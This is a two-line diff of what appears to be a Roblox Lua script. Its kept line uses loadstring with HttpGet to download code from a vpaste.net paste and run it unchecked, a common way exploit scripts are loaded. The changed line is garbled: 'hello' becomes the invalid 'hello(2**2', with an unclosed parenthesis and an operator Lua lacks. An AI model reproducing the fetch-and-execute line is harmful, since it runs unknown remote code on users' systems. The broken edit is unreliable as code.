@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("http://vpaste.net/Q2If4"))()
-hello
+hello(2**2
